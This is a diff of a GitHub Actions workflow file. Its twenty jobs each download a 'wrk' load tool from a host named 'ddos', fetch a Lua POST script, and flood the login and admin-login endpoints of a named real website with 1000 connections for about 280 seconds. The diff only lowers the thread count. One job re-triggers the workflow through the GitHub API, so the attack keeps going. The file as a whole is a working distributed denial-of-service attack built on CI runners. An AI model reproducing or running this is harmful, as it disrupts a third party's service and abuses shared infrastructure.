@@ -16,7 +16,7 @@ jobs:
         run: |
           wget https://ddos.nms.workers.dev/wrk
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d280s http://wy.targetedu.cn:9999/login/verify/0.6069696256114081
+          ./wrk -c1000 -t100 -d280s http://wy.targetedu.cn:9999/login/verify/0.6069696256114081
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
 
 
@@ -29,7 +29,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build3:
@@ -41,7 +41,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build4:
@@ -53,7 +53,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build5:
@@ -65,7 +65,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build6:
@@ -77,7 +77,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build7:
@@ -89,7 +89,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build8:
@@ -101,7 +101,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build9:
@@ -113,7 +113,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build10:
@@ -125,7 +125,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build11:
@@ -137,7 +137,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build12:
@@ -149,7 +149,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build13:
@@ -161,7 +161,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build14:
@@ -173,7 +173,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build15:
@@ -185,7 +185,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build16:
@@ -197,7 +197,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build17:
@@ -209,7 +209,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build18:
@@ -221,7 +221,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build19:
@@ -233,7 +233,7 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
 
 
   build20:
@@ -245,4 +245,4 @@ jobs:
           wget https://ddos.nms.workers.dev/wrk
           wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           chmod 777 wrk
-          ./wrk -c1000 -t300 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
+          ./wrk -c1000 -t100 -d279s -spost.lua http://wy.targetedu.cn/targetedu/index.php/adminUtil/login
